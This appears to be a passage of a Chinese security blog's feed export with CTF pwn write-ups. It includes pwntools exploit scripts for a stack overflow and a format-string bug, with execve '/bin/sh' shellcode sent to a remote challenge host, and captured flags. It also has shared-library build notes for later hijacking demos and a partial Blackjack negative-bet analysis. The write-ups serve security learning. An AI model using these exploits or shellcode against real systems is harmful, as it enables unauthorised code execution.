<span class="hljs-number">30567</span>)<br><br>cat_flag = <span class="hljs-number">0x08048694</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">24</span><br>payload += p32(cat_flag)<br>payload += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">260</span> - <span class="hljs-number">24</span> - <span class="hljs-number">4</span>)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Your choice:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Please input your username:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;Hvnt3r&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Please input your passwd:&#x27;</span>)<br>io.sendline(payload)<br><br><span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-built_in">print</span>(io.recv())<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">cyberpeace&#123;<span class="hljs-number">1</span>ca<span class="hljs-number">6</span>cd<span class="hljs-number">8943</span>a<span class="hljs-number">40</span>dc<span class="hljs-number">6698</span>ef<span class="hljs-number">90</span>a<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>f<span class="hljs-number">4</span><span class="hljs-keyword">cc</span><span class="hljs-number">6</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>格式化字符串漏洞，现实少见，比赛多见</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">unsigned __int64 sub_400BB9()<br>&#123;<br>  <span class="hljs-built_in">int</span> v1; // [rsp+4h] [rbp-7Ch]<br>  __int64 v2; // [rsp+8h] [rbp-78h]<br>  char <span class="hljs-built_in">format</span>; // [rsp+10h] [rbp-70h]<br>  unsigned __int64 v4; // [rsp+78h] [rbp-8h]<br><br>  v4 = __readfsqword(0x28u);<br>  v2 = 0LL;<br>  puts(<span class="hljs-string">&quot;You travel a short distance east.That&#x27;s odd, anyone disappear suddenly&quot;</span>);<br>  puts(<span class="hljs-string">&quot;, what happend?! You just travel , and find another hole&quot;</span>);<br>  puts(<span class="hljs-string">&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;</span>);<br>  puts(<span class="hljs-string">&quot;go into there(1), or leave(0)?:&quot;</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">1</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;A voice heard in your mind&quot;</span>);<br>    puts(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;&quot;</span>);<br>    _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v2);<br>    puts(<span class="hljs-string">&quot;And, you wish is:&quot;</span>);<br>    _isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;<span class="hljs-built_in">format</span>);    &lt;====== Here<br>    puts(<span class="hljs-string">&quot;Your wish is&quot;</span>);<br>    printf(&amp;<span class="hljs-built_in">format</span>, &amp;<span class="hljs-built_in">format</span>);        &lt;====== Here<br>    puts(<span class="hljs-string">&quot;I hear it, I hear it....&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(0x28u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过<code>%x</code>看偏移，其实不用着这种方法也能知道，64位函数参数前六个参数再寄存器中，第7个参数在栈中，下面给出的<code>secret[0] is 11cc010</code>，通过<code>%x</code>确认偏移为7</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs applescript">we are wizard, we will give you hand, you can <span class="hljs-keyword">not</span> defeat dragon <span class="hljs-keyword">by</span> yourself ...<br>we will <span class="hljs-keyword">tell</span> you two secret ...<br>secret[<span class="hljs-number">0</span>] <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>cc010<br>secret[<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>cc014<br>do <span class="hljs-keyword">not</span> <span class="hljs-keyword">tell</span> anyone <br>What should your <span class="hljs-built_in">character</span>&#x27;s <span class="hljs-built_in">name</span> be:<br>asd<br>Creating a new player.<br> This <span class="hljs-keyword">is</span> a famous <span class="hljs-keyword">but</span> quite unusual inn. The air <span class="hljs-keyword">is</span> fresh <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span><br>marble-tiled ground <span class="hljs-keyword">is</span> clean. Few rowdy guests can be seen, <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span><br>furniture looks undamaged <span class="hljs-keyword">by</span> brawls, which are very common <span class="hljs-keyword">in</span> other pubs<br>all <span class="hljs-keyword">around</span> <span class="hljs-keyword">the</span> world. The decoration looks extremely valuable <span class="hljs-keyword">and</span> would fit<br><span class="hljs-keyword">into</span> a palace, <span class="hljs-keyword">but</span> <span class="hljs-keyword">in</span> this city <span class="hljs-keyword">it</span>&#x27;s quite ordinary. In <span class="hljs-keyword">the</span> <span class="hljs-keyword">middle</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span><br>room are velvet covered chairs <span class="hljs-keyword">and</span> benches, which surround large oaken<br>tables. A large sign <span class="hljs-keyword">is</span> fixed <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> northern wall <span class="hljs-keyword">behind</span> a wooden bar. In<br>one corner you notice a fireplace.<br>There are two obvious exits: east, up.<br>But strange thing <span class="hljs-keyword">is</span> ,no one there.<br>So, <span class="hljs-keyword">where</span> you will go?east <span class="hljs-keyword">or</span> up?:<br>east<br>You travel a short distance east.That&#x27;s odd, anyone disappear suddenly<br>, what happend?! You just travel , <span class="hljs-keyword">and</span> find another hole<br>You recall, a big black hole will suckk you <span class="hljs-keyword">into</span> <span class="hljs-keyword">it</span>! Know what should you do?<br>go <span class="hljs-keyword">into</span> there(<span class="hljs-number">1</span>), <span class="hljs-keyword">or</span> leave(<span class="hljs-number">0</span>)?:<br><span class="hljs-number">1</span><br>A voice heard <span class="hljs-keyword">in</span> your mind<br>&#x27;Give <span class="hljs-keyword">me</span> an address&#x27;<br><span class="hljs-number">18661392</span><br>And, you wish <span class="hljs-keyword">is</span>:<br>%x.%x.%x.%x.%x.%x.%x.%x.%x.<br>Your wish <span class="hljs-keyword">is</span><br>ea3c76a3.ea3c8780.ea0f92c0.ea5ef700.ea5ef700<span class="hljs-number">.22</span><span class="hljs-number">.11</span>cc010<span class="hljs-number">.252e7825</span><span class="hljs-number">.2e78252</span>e.I hear <span class="hljs-keyword">it</span>, I hear <span class="hljs-keyword">it</span>....<br>Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!<br>Dragon <span class="hljs-built_in">say</span>: HaHa! you were supposed <span class="hljs-keyword">to</span> have a normal<br>RPG game, <span class="hljs-keyword">but</span> I have changed <span class="hljs-keyword">it</span>! you have no weapon <span class="hljs-keyword">and</span> <br>skill! you could <span class="hljs-keyword">not</span> defeat <span class="hljs-keyword">me</span> !<br>That&#x27;s sound terrible! you meet final boss!<span class="hljs-keyword">but</span> you level <span class="hljs-keyword">is</span> ONE!<br></code></pre></td></tr></table></figure><p>而且这个题中有一个强制类型转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);<br>v1 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>read(<span class="hljs-number">0</span>, v1, <span class="hljs-number">0x100</span>uLL);<br>((<span class="hljs-type">void</span> (__fastcall *)(_QWORD, <span class="hljs-type">void</span> *))v1)(<span class="hljs-number">0LL</span>, v1);   &lt;====<br></code></pre></td></tr></table></figure><p>用户输入会被直接执行，这里就放入shellcode。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">36839</span>)<br><br>io.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)<br>arr_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>payload = asm(shellcraft.sh())<br>payload2 = <span class="hljs-string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;What should your character\&#x27;s name be:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;hvnt3r&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;So, where you will go?east or up?:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;east&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;go into there(1), or leave(0)?:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;\&#x27;Give me an address\&#x27;&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(arr_addr))<br>io.recvuntil(<span class="hljs-string">&#x27;And, you wish is:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;%85c%7$n&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Wizard: I will help you! USE YOU SPELL&#x27;</span>)<br>io.sendline(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cyberpeace&#123;e835aafd1184958de3f77<span class="hljs-number">27a97536540</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>ret2libc</p><p><a href="https://www.freebuf.com/articles/system/193646.html">Pwntools之DynELF原理探究</a></p><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;a37050cd56a9dc4f19b4caff856ef86f&#125;</span><br></code></pre></td></tr></table></figure><hr><blockquote><p>最近工作很忙真是抽不出时间更新博客呢🙃</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;get-shell&quot;&gt;&lt;a href=&quot;#get-shell&quot; class=&quot;headerlink&quot; title=&quot;get_shell&quot;&gt;&lt;/a&gt;get_shell&lt;/h3&gt;&lt;p&gt;直接nc连接cat flag即可：&lt;/p&gt;
&lt;figure class=&quot;highlight dns&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs dns&quot;&gt;cyberpeace&amp;#123;d1070f116850587b8304cd1aa&lt;span class=&quot;hljs-number&quot;&gt;55565e6&lt;/span&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://www.hvnt3r.top/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://www.hvnt3r.top/tags/PWN/"/>
    
    <category term="二进制安全" scheme="https://www.hvnt3r.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="https://www.hvnt3r.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux动态链接库.so的生成与使用</title>
    <link href="https://www.hvnt3r.top/2019/08/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93-so%E7%9A%84%E7%94%9F%E6%88%90%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.hvnt3r.top/2019/08/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93-so%E7%9A%84%E7%94%9F%E6%88%90%E4%B8%8E%E4%BD%BF%E7%94%A8/</id>
    <published>2019-08-07T12:56:01.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<p>用到以下三个文件，为以后展开相关攻击过程做铺垫。</p><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">print_test</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>print_test();<br>sleep(<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><p>lib_ptrace_normal.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">print_test</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am good guy&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>lib_ptrace_attack.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">print_test</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am bad guy :P&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用如下命令编译so文件：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">test<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/ptrace</span><span class="hljs-variable">$ </span>gcc -fPIC -shared lib_ptrace_normal.cpp  -o lib_normal.so<br>test<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/ptrace</span><span class="hljs-variable">$ </span>gcc -fPIC -shared lib_ptrace_attack.cpp  -o lib_attack.so<br></code></pre></td></tr></table></figure><p>参数说明：</p><blockquote><p>如果想创建一个动态链接库，可以使用 GCC 的<code>-shared</code>选项。输入文件可以是源文件、汇编文件或者目标文件。</p><p>另外还得结合<code>-fPIC</code>选项。-fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。 </p></blockquote><p>编辑<code>/etc/ld.so.conf.d/libc.conf</code>，在文件末尾添加生成so文件的目录，然后执行<code>sudo ldconfig</code>使设置生效。</p><p>之后执行来将 <code>main.c</code> 和 <code>lib_normal.so</code> 一起编译成<code>main.out</code>，当 <code>main.out</code> 运行时，会动态地加载链接库 <code>lib_normal.so</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc main.c -L. -l_normal -o main.out<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>-L</code>：指定<code>lib</code>文件的目录，本例中<code>lib_normal.so</code>与<code>main.c</code>处于同一目录下，所以使用<code>.</code>表示当前目录，如需指定其他目录可以写成：<code>-L/usr/lib/xxx</code>的形式</li><li><code>-l</code>：指定lib文件的文件名称，在本例中将<code>lib_normal.so</code>分解为三部分：<code>lib + _normal + .so</code>，-l参数之后仅需写这三部分的中间部分即<code>_normal</code>。</li></ul><p>执行<code>ldd</code>命令查看<code>main.out</code>的链接情况，可以看到系统可以找到<code>lib_normal.so</code>的位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>@ubuntu:~/ptrace$ ldd main.out <br>linux-vdso.so.1 =&gt;  (0x00007fff045df000)<br>lib_normal.so =&gt; /home/test/ptrace/lib_normal.so (0x00007fa8428c0000)<br>libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa8424f7000)<br>/lib64/ld-linux-x86-64.so.2 (0x000055ca59221000)<br></code></pre></td></tr></table></figure><p>此时运行<code>main.out</code>，运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>@ubuntu:~/ptrace$ ./main.out <br><br>I am good guy<br>I am good guy<br>I am good guy<br><br></code></pre></td></tr></table></figure><blockquote><p>此处有一点疑问，为何在程序刚运行时缺少了一次<code>print_test()</code>的调用，直接打印了<code>\n</code>？个人猜想是虚拟环境磁盘IO性能差导致此函数在so文件未被成功加载的时候跳过了？</p></blockquote><p>Done!🍟</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;用到以下三个文件，为以后展开相关攻击过程做铺垫。&lt;/p&gt;
&lt;p&gt;main.c&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs c&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;#&lt;span class=&quot;hljs-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;hljs-meta&quot;&gt;#&lt;span class=&quot;hljs-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;hljs-type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;hljs-title function_&quot;&gt;print_test&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;hljs-type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;hljs-title function_&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&amp;#123;&lt;br&gt;	&lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;)&amp;#123;		&lt;br&gt;		print_test();&lt;br&gt;		sleep(&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;);&lt;br&gt;	&amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.hvnt3r.top/categories/Linux/"/>
    
    
    <category term="二进制安全" scheme="https://www.hvnt3r.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="https://www.hvnt3r.top/tags/Linux/"/>
    
    <category term="Linux动态链接库" scheme="https://www.hvnt3r.top/tags/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr_Part_1_15/21</title>
    <link href="https://www.hvnt3r.top/2019/08/Pwnable-kr-Part-1-15-21/"/>
    <id>https://www.hvnt3r.top/2019/08/Pwnable-kr-Part-1-15-21/</id>
    <published>2019-08-06T15:09:11.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Pwnable-kr-BlackJack-逻辑漏洞"><a href="#Pwnable-kr-BlackJack-逻辑漏洞" class="headerlink" title="Pwnable.kr-BlackJack-逻辑漏洞"></a>Pwnable.kr-BlackJack-逻辑漏洞</h2><p>游戏代码在这里:<a href="https://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html">https://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></p><p>查看代码发现代码量很多，以为很复杂，但静下心看一下发现其实很简单，大部分代码用来实现游戏逻辑，获取flag的条件是成为百万富翁，就是使自己的余额大于一百万，游戏规则介绍中也说了，不要试着真去赌，因为每一把都是随机的，很可能一夜回到解放前，因此要寻找题目中的漏洞，按照经验，这种题出现漏洞可能是整数溢出或者是数据校验不严格，然后我发现题目中对用户输入赌注的地方缺乏负数校验：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">betting</span><span class="hljs-params">()</span> <span class="hljs-comment">//Asks user amount to bet</span><br>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\nEnter Bet: $&quot;</span>);<br> <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;bet);<br><br> <span class="hljs-keyword">if</span> (bet &gt; cash) <span class="hljs-comment">//If player tries to bet more money than player has</span><br> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou cannot bet more money than you have.&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter Bet: &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;bet);<br>        <span class="hljs-keyword">return</span> bet;<br> &#125;<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> bet;<br>&#125; <span class="hljs-comment">// End Function</span><br></code></pre></td></tr></table></figure><span id="more"></span><p>而在游戏主要逻辑中也没有对输入的赌注进行进一步验证而是直接参与了运算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">stay</span><span class="hljs-params">()</span> <span class="hljs-comment">//Function for when user selects &#x27;Stay&#x27;</span><br>&#123;<br>     dealer(); <span class="hljs-comment">//If stay selected, dealer continues going</span><br>     <span class="hljs-keyword">if</span>(dealer_total&gt;=<span class="hljs-number">17</span>)<br>     &#123;<br>      <span class="hljs-keyword">if</span>(player_total&gt;=dealer_total) <span class="hljs-comment">//If player&#x27;s total is more than dealer&#x27;s total, win</span><br>      &#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nUnbelievable! You Win!\n&quot;</span>);<br>         won = won+<span class="hljs-number">1</span>;<br>         cash = cash+bet;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);<br>         dealer_total=<span class="hljs-number">0</span>;<br>         askover();<br>      &#125;<br>      <span class="hljs-keyword">if</span>(player_total&lt;dealer_total) <span class="hljs-comment">//If player&#x27;s total is less than dealer&#x27;s total, loss</span><br>      &#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nDealer Has the Better Hand. You Lose.\n&quot;</span>);<br>         loss = loss+<span class="hljs-number">1</span>;<br>         cash = cash - bet;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);<br>         dealer_total=<span class="hljs-number">0</span>;<br>         askover();<br>      &#125;<br>      <span class="hljs-keyword">if</span>(dealer_total&gt;<span class="hljs-number">21</span>) <span class="hljs-comment">//If dealer&#x27;s total is more than 21, win</span><br>      &#123;<br>         <span 